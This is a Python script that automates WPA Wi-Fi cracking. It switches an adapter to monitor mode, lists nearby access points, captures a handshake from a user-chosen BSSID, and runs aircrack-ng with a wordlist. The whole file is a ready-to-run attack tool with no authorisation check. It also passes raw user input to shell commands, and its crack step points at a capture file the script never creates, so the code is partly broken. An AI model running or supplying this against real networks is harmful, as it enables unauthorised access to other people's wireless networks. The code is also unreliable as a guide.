import subprocess, os, time, sys, json
CAP_DIR = "/opt/warlab/captures"
os.makedirs(CAP_DIR, exist_ok=True)

def run(cmd):
    subprocess.run(cmd, shell=True, check=True)

def cli_entry(_):
    iface = "wlan0"           # change if your adapter uses wlan1
    mon = iface + "mon"

    print("[*] Enabling monitor mode")
    run(f"sudo ip link set {iface} down")
    run(f"sudo iw dev {iface} set type monitor")
    run(f"sudo ip link set {iface} up")
    run(f"sudo ip link set {iface} name {mon}")

    print("[*] Listing nearby APs (press Ctrl+C when you see your target)")
    try:
        run(f"timeout 15s sudo airodump-ng {mon} --band abg")
    except subprocess.CalledProcessError:
        pass

    target = input("BSSID to capture: ").strip()
    channel = input("Channel: ").strip()

    ts = int(time.time())
    pcap = f"{CAP_DIR}/handshake_{ts}.pcap"

    print("[*] Capturing handshake; stop after you see 'WPA handshake' top-right")
    cap_cmd = f"sudo airodump-ng -c {channel} --bssid {target} -w {CAP_DIR}/handshake {mon}"
    try:
        run(cap_cmd)
    except KeyboardInterrupt:
        pass

    print(f"[+] Saved to {pcap}")

    dict_path = input("Path to wordlist for aircrack (blank to skip crack): ").strip()
    if dict_path:
        print("[*] Attempting crack with aircrack-ng")
        run(f"aircrack-ng {pcap} -w {dict_path} -l {CAP_DIR}/cracked_{ts}.txt")

    print("[*] Restoring managed mode")
    run(f"sudo ip link set {mon} down")
    run(f"sudo iw dev {mon} set type managed")
    run(f"sudo ip link set {mon} name {iface}")
    run(f"sudo ip link set {iface} up")


